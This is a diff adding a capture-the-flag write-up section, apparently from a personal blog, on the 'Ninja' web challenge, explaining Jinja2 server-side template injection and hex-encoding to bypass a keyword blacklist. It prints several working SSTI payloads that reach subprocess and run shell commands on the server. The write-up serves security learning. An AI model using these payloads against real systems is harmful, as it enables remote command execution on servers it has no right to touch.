@@ -776,6 +776,88 @@ Voila 🪄 !! We have our flag by just following the **`Response`** packets from
 response to their corresponding characters. The final flag was **`flag{Ms_Fr1ZZL3_W0ULD_b3_s0_Pr0UD}`**.
 
 
+## Ninja 🥷
+Web
+{: .label .label-green .fs-1 .ml-0}
+
+Template Injection
+{: .label .label-green .fs-1 .ml-0}
+
+This was the first and supposedly the easiest challenge under the **Web** category. Unfortunately I was not able to complete it before the
+challenge was closed. However I did near the soul of the challenge and the underlying vulnerability which needed to be exploited.
+
+> Note:  
+> The write up for this challenge might not be too elaborate as I do not have the first hand details of solving 
+> this challenge. However I will try to show what is the underlying vulnerability and essence of exploiting it.
+
+Challenge instructions:  
+> Hey guys come checkout this website i made to test my ninja-coding skills.
+
+THe website took a name and greeted us back with **Hello <name>**. This means we have some controllable text which will be
+inserted again into the response HTML content.
+
+On this basis I started trying out basic XSS attacks using payloads like **`document.cookie`** etc. But then obviously the
+challenge was not this simple.  
+
+In this process I also got an error message when the name I entered contained an **`_`** symbol. The error message said that
+the symbols/phrases containing **`_`**, **`os`**, **`RUNCMD`**, **`config`**, **`base`** etc. These did not make sense to me
+at all untill I found out the below mentioned points.
+
+I will now highlight the specific things I totally missed to notice when I initially attempted this challenge which would
+have helped me to move in the right direction. Also these are few things which can be useful for any Web based challenge:
+1. Analyzing the request/response headers of a simple request. In this specific challenge, it gave away the fact that the
+   server was running using the [Werkzeug][39] WSGI framework and Python v2.7.x.
+2. Also knowing the first point and the challenge title it was an easy guess to assume that the server was powered by [Jinja][40]
+   templates for HTML scripting and dynamic DOM content.
+
+Based on the above two points I started searching for vulnerabilities in the **Jinja** scripting framework as we had the
+ability to inject any content into the template. After searching I landed in the following two links that gave me a great 
+idea on what this challenge was based on:
+1. [Jinja2 SSTI filter bypasses][41]
+2. [Jinja2 SSTI research][42]
+
+I recommend you to read the above articles too. Also SSTI stands for **Server side template Injection**.
+
+Based on the above details I tried few basic SSTI with the below payloads:
+1. **`()|attr('\x5f\x5fclass\x5f\x5f')`**
+2. **`()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()`**
+
+Let me break down the above syntax and where the above syntax originates. Remember the string we enter in the name field
+will actually get rendered within a Jinja template and more specifically within the dynamic template syntax between double
+curly brace syntax of **`{{`** and **`}}`**.  
+
+This also means any valid Python object can be passed and the resulting representation of the final result will be used.
+
+In Jinja 2 templates the syntax to refer to an attribute of an object is to separate the object and attribute name by a 
+pipe (**`|`**) symbol. So all pipe symbols in the above two syntax are actually a level of depth to which we are entering
+into the object. 
+
+Also the current objects attributes can be obtained using an empty method invocation **`()`**. That is the reason for the
+initial parentheses.  
+Thus the first payload actually returns the class objects representation of the current object which
+would be the Jinja runtime environment. The second payload actually invokes the a function chain to find all sub classes
+included via different imports to the current class.  
+
+Our goal lies in reaching the global, builtins object and importing the **`os`** module and invoking command. Even though
+the **`runcmd`** and **`os`** strings are blacklisted, their hex counter parts are not detected during the blacklist filter
+validation. So encoding **`os`** as **`\x6f\x73`** and **`runcmd`** as **`\x72\x75\x6e\x63\x6d\x64`** helps us perform an
+injection and obtaining a shell in the server.
+
+From there we can execute any kind of commands like **`ls`**, **`locate`** etc to find the location of **`flag.txt`** and
+read off the flag content.
+
+There are various payloads which can be used to exploit the challenge. Another main vulnerability was that the server allowed
+and processed any unintended parameters. There was no validation of user input params apart from the validation done for the
+specific **`value`** parameter.
+
+Some of the payloads seen from other community write ups include the below:
+1. **`{{()|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5f"+"b"+"ase\x5f\x5f")|attr("\x5f\x5fsubclasses\x5f\x5f")()|attr("\x5f\x5fgetitem\x5f\x5f")(258)("cat flag.txt",shell=True,stdout=-1)|attr("communicate")()}}`**
+2. **`{{''[request.args.a][request.args.b][2][request.args.c]()[258]('cat+flag.txt',shell%3dTrue,stdout%3d-1).communicate()[0].strip()}}&a=__class__&b=__mro__&c=__subclasses__`**
+3. **`{{()|attr(%27\x5f\x5fclass\x5f\x5f%27)|attr(%27\x5f\x5f\x62\x61\x73\x65\x5f\x5f%27)|attr(%27\x5f\x5fsubclasses\x5f\x5f%27)()|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(258)(%27cat+flag.txt%27,shell=True,stdout=-1)|attr(%27communicate%27)()|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(0)|attr(%27decode%27)(%27utf-8%27)}}`**
+
+The final flag (also seen from community write ups) was **`flag{m0mmy_s33_1m_4_r34l_n1nj4}`**.
+
+
 
 
 [1]: https://ctftime.org/team/439
@@ -816,3 +898,7 @@ response to their corresponding characters. The final flag was **`flag{Ms_Fr1ZZL
 [36]: https://ctf.csaw.io/files/b7a0512fe35be8e0a9f84b24c0615b33/modbus.pcap?token=eyJ1c2VyX2lkIjo5MDAsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjI5Njl9.YT99Vw.CzQQNjB6OF_iW77fdusvzmXJE6I
 [37]: https://mega.nz/file/Ut5mGQLB#IbORTBDkvA2KVt0tuTqIE32s1gHbOdFlqeC-f34LYEI
 [38]: https://www.modbustools.com/modbus.html#function03
+[39]: https://werkzeug.palletsprojects.com/en/2.0.x/tutorial/#
+[40]: https://jinja.palletsprojects.com/en/3.0.x/
+[41]: https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f
+[42]: https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
